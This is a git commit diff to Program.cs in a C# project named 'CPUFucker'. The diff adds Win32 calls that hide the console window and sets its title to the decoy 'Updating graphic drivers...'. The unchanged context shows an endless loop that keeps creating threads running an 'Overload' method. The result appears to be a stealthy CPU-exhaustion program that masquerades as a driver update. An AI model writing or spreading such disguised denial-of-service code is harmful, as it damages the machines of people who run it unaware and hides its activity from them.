cf9b07b2c7c543f74f62ff3f596b6cd82a76c8fd
Seyz <36236750+Seyz123@users.noreply.github.com>
2020-01-01 15:48:11 -0800

    Some updates lel
    yES

--- Program.cs
+++ Program.cs
@@ -1,11 +1,18 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Runtime.InteropServices;
 using System.Threading;
 
 namespace CPUFucker
 {
     class Program
     {
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        
         public static List<Thread> Threads1 = new List<Thread>();
         public static List<Thread> Threads2 = new List<Thread>();
         public static List<Thread> Threads3 = new List<Thread>();
@@ -13,6 +20,11 @@ namespace CPUFucker
         
         static void Main(string[] args)
         {
+            // Hide console :)
+            Console.Title = "Updating graphic drivers..."; // Why ? Don't ask me.
+            IntPtr handle = GetConsoleWindow();
+            ShowWindow(handle, 0);
+            
             while (true)
             {
                 Threads1.Add(new Thread(new ThreadStart(Overload)));
